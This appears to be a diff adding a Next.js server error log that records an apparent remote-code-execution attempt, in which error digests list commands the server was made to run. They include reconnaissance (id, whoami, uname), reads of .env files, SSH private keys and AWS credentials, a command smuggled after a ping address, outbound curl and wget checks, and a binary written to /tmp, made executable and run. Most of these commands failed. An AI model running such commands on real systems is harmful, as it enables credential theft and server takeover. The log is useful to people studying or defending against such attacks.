@@ -1,0 +1,149 @@
+[Instrumentation] Logging initialized. Writing to: /app/logs/server.safe.log
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"id","args":[],"error":"Command not found","message":"spawnSync id ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"whoami","args":[],"error":"Command not found","message":"spawnSync whoami ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"uname","args":["-a"],"error":"Command not found","message":"spawnSync uname ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"pwd","args":[],"error":"Command not found","message":"spawnSync pwd ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"ls","args":["-la"],"error":"Command not found","message":"spawnSync ls ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":[".env"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":[".env.local"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":[".env.production"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":[".env.development"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["../.env"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["/app/.env"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["~/.ssh/id_rsa"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["~/.ssh/id_ed25519"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["~/.ssh/authorized_keys"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["/root/.ssh/id_rsa"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["/root/.ssh/authorized_keys"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["~/.aws/credentials"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["~/.aws/config"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["/root/.aws/credentials"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"cat","args":["/root/.aws/config"],"error":"Command not found","message":"spawnSync cat ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"curl","args":["-fsSL","https://www.google.com"],"error":"Command not found","message":"spawnSync curl ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"wget","args":["-qO-","https://www.google.com"],"error":"Command not found","message":"spawnSync wget ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"iptables","args":["-L"],"error":"Command not found","message":"spawnSync iptables ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"ufw","args":["status"],"error":"Command not found","message":"spawnSync ufw ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"systemctl","args":["status","ssh"],"error":"Command not found","message":"spawnSync systemctl ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"sudo","args":["-n","true"],"error":"Command not found","message":"spawnSync sudo ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"ping","args":["-c","1","8.8.8.8;","whoami"],"error":"Command not found","message":"spawnSync ping ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"node","args":["-e","console.log(\'hello from Node.js RCE\');"],"error":"Command not found","message":"spawnSync node ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"command":"node","args":["-e","require(\'axios\').get(\'https://www.google.com\').then(res => console.log(res.status)).catch(err => console.error(err.message));"],"error":"Command not found","message":"spawnSync node ENOENT","stdout":"","stderr":"","status":null,"signal":null}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"Pre-run Cleanup","success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"1. Write Initial Chunk to /tmp/hello_test","success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"1.1 Append Chunk to /tmp/hello_test","success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"1.2 Append Chunk to /tmp/hello_test","success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"2. Verify Binary was Written","verification":{"dev":157,"mode":33188,"nlink":1,"uid":0,"gid":0,"rdev":0,"blksize":4096,"ino":2,"size":1228952,"blocks":2408,"atimeMs":1766188478235.239,"mtimeMs":1766188478282.299,"ctimeMs":1766188478282.299,"birthtimeMs":1766188478235.239,"atime":"2025-12-19T23:54:38.235Z","mtime":"2025-12-19T23:54:38.282Z","ctime":"2025-12-19T23:54:38.282Z","birthtime":"2025-12-19T23:54:38.235Z"},"success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"3. Chmod Binary to 777","success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"4. Execute Binary","stdout":"","stderr":"","error_obj":{"message":"spawnSync /tmp/hello_test EACCES","code":"EACCES"},"success":true}`'
+}
+ ⨯ Error: NEXT_REDIRECT
+    at ignore-listed frames {
+  digest: '`{"step":"Post-run Cleanup","success":true}`'
+}
